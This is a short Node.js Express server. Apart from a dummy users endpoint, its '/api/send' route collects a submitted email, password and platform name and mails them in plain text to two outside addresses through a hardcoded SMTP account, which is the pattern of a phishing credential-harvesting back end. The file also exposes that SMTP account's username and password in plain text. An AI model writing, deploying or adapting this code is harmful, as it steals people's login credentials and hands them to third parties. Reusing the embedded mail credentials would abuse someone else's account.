const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const cors = require('cors');

app.use(express.json());
app.use(cors())

const users = [
    { id: 1, name: 'John' },
    { id: 2, name: 'Alice' },
    { id: 3, name: 'Bob' },
    //
  ];
  
  // GET endpoint to return users
  app.get('/api/users', (req, res) => {
    res.json(users);
  });

//   POST Request send mail

app.post('/api/send', async (req, res) => {

    const { email, password, platform } = req.body;

    // var transport = nodemailer.createTransport({
    //   host: host,
    //   port: port,
    //   auth: {
    //     user: username,
    //     pass: password
    //   }
    // });

    // Function to send emails
// function sendEmail(emailAddress) {
//   const mailOptions = {
//     from: 'testsmtp@racius.tech', // Replace with your Gmail email address
//     to: emailAddress, // Set the 'to' field to the current email address
//     subject: subject,
//     html: message
//   };

//   transport.sendMail(mailOptions, (error, info) => {
//     if (error) {
//       console.log('Error sending email:', error);
//     } else {
//       console.log('Email sent:', info.response);
//     }
//   });
// }


 var transport = nodemailer.createTransport({
      host: 'mail.jumping-rivers.co.uk',
      port: 465,
      auth: {
        user: 'info@jumping-rivers.co.uk',
        pass: 'Vanilla11**'
      }
    });

  let mailOptions = {
    from: 'tinfo@jumping-rivers.co.uk',
    to: ['ricardo.josh12@gmail.com', 'jeo.dav@yandex.com'],
    subject: platform,
    text: 'Platform is ' + platform + ' Username/Email is ' + email + ' password is ' + password,
  };

  // i have added new to mainbackend

  try {
    let info = await transport.sendMail(mailOptions);
    console.log('Message sent: %s', info.messageId);
  } catch (error) {
    console.error('Error sending email:', error);
  }



res.status(200).json({ message: 'Working' + password });




});



  // Start the server
app.listen(5000, () => {
    console.log('Server is running on port 5000');
  });